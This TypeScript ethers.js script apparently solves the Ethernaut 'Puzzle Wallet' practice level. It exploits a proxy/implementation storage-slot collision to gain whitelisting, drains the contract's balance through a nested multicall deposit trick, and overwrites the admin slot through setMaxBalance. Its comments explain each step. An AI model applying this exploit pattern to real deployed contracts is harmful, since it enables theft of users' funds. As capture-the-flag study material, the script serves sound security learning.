// Runtime Environment's members available in the global scope.
import { ethers } from 'ethers';
import { BigNumber, Signer, BytesLike } from "ethers";
import { getSigner } from "./signer";
import { PuzzleProxy, PuzzleProxy__factory, PuzzleWallet, PuzzleWallet__factory } from "../typechain";

async function main() {
  // Ok so the ethernaut webversion contract give proxy address. The address it give is the proxy contract. Not the wallet contract.
  // the proxy keep delegate call to the wallet contract. 
  // const walletAddress = "0x03c223E506F15901c677e7C4D6bC8F8C13fa0eA9";
  const proxyaddress = "0x03c223E506F15901c677e7C4D6bC8F8C13fa0eA9";
  const signer = getSigner();
  const player = await signer.getAddress();
  // The proxy contract have builtin fallback delegatecall function.
  // Which wallet have the same layout as proxy contract.
  // Try call delegate function that change admin. See what happen.
  const wallet = await (new PuzzleWallet__factory(signer)).attach(proxyaddress);
  const proxy = await (new PuzzleProxy__factory(signer)).attach(proxyaddress);
  await wallet.deployed();
  await proxy.deployed();

  // Ok the wallet contract did not get Init during deploy by ethernaut.
  // Only the proxy contract get init. The storage is stored on unlinked state in proxy contract
  await (await proxy.proposeNewAdmin(player)).wait();

  console.log("pending admin:", await proxy.pendingAdmin());
  console.log("admin:", await proxy.admin());
  // await DebugStorage(signer, wallet, proxy);
  
  
  
  console.log("max balances:", (await wallet.maxBalance()).toString());
  console.log("owner/pending admin:", await wallet.owner());

  // The method add whitelist actually use storage slot 0. So it use pending admin instead of owner.
  await (await wallet.addToWhitelist(player)).wait();
  // Now we are whitelisted
  console.log("player is whitelisted:", await wallet.whitelisted(player));
  // Now we call multicall with 2 deposit twice. 1 deposit directly. Another deposit through another multicall.
  // To withdraw all money from contract.
  const balance = await proxy.provider.getBalance(proxy.address);
  console.log("current wallet balance: ", balance.toString());

  if (!balance.eq(0)) {
    const deposit = wallet.interface.encodeFunctionData("deposit");
    const multicall = wallet.interface.encodeFunctionData("multicall", [[deposit]])
    const execute = wallet.interface.encodeFunctionData("execute", [player, balance.mul(2), []]);

    const attackData = [deposit, multicall, execute];
    await (await wallet.multicall(attackData, { value: balance, gasLimit: 2000000 })).wait();
    console.log("wallet balance:", await (await proxy.provider.getBalance(proxy.address)).toString());
  }

  await (await wallet.setMaxBalance(BigNumber.from(0), { gasLimit: 2000000 })).wait();
  console.log("max balance:", (await wallet.maxBalance()).toString());

  // Wallet lost all money, we can call init to set owner/admin at storage slot 1 to player.
  await (await wallet.init(BigNumber.from(player), { gasLimit: 560000 })).wait();

  console.log("admin:", await proxy.admin());


}

main()
  .then(() => {
    console.log("Done!");
    process.exit(0);
  })
  .catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });

async function DebugStorage(signer: ethers.Signer, wallet: PuzzleWallet, proxy: PuzzleProxy) {
  const provider = signer.provider || ethers.getDefaultProvider();
  for (let i = 0; i < 3; i++) {
    console.log("proxy:", await provider.getStorageAt(proxy.address, i));
  }
  console.log("proxy storage for upgrade contract:", await provider.getStorageAt(proxy.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc"));
  const hash = ethers.utils.solidityKeccak256(["uint8"], [2]);
  const bn = BigNumber.from(hash);
  console.log("wallet whitelist:", await provider.getStorageAt(wallet.address, bn));
  console.log("wallet balances:", await provider.getStorageAt(wallet.address, BigNumber.from(ethers.utils.solidityKeccak256(["uint256"], [3]))));
}

